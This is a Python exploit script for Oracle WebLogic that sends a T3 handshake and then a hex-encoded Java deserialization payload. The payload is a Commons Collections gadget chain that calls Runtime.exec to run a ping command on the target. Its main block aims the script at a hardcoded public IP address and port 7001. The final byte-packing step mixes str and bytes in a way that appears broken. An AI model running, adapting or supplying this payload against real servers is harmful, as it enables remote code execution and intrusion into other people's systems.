# https://github.com/rabbitmask/WeblogicR
# !/usr/bin/env python
# _*_ coding:utf-8 _*_

import socket
import struct, requests
from binascii import unhexlify

heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
}


def islive(ip):
    r = requests.get(ip, headers=heads, allow_redirects=False, timeout=10, verify=False)
    return r.status_code


def poc(ip):
    try:
        if islive(ip) == 200:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            if '://' in str(ip):
                ip = ip.split('//')[1]
            rip = ip.split(':')[0]
            rport = int(ip.split(':')[1])
            server_address = (str(rip), rport)
            try:
                sock.connect(server_address)
                headers = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
                sock.sendall(headers)
                data = sock.recv(1024)
            except:
                pass
            chunk1 = b'\x00\x00\x0b\x4d\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'

            chunk2 = b"\xac\xed\x00\x05\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x71\x00\x7e\x00\x00\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x78\x70\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1e\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1b\x73\x71\x00\x7e\x00\x16\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x19\x70\x69\x6e\x67\x20\x2d\x63\x20\x34\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x35\x33\x2e\x31\x33\x30\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x01\x71\x00\x7e\x00\x23\x73\x71\x00\x7e\x00\x11\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\x00\x00\x00\x01\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x00\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x71\x00\x7e\x00\x3a"

            chunk3 = b'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'

            totallength = len(chunk1) + len(chunk2) + len(chunk3)

            len_hex = hex(totallength)

            len_hex = len_hex.replace('0x', '0')

            s1 = len_hex[:2]
            s2 = len_hex[2:4]
            len_hex = unhexlify(s1 + s2)

            chunk1 = b'\x00\x00' + len_hex + b'\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'

            payload = chunk1 + chunk2 + chunk3

            payload = "{0}{1}".format(struct.pack(b'!i', len(payload)), payload[4:])
            try:
                sock.send(payload.encode())
                response = sock.recv(15000)
                result = "目标Weblogic测试返回内容为{} : %s".format(response) % ip
                sock.shutdown(2)
                sock.close()
                return result
            except:
                pass
    except:
        pass


if __name__ == '__main__':
    a = poc('181.198.62.181:7001')
    print(a)
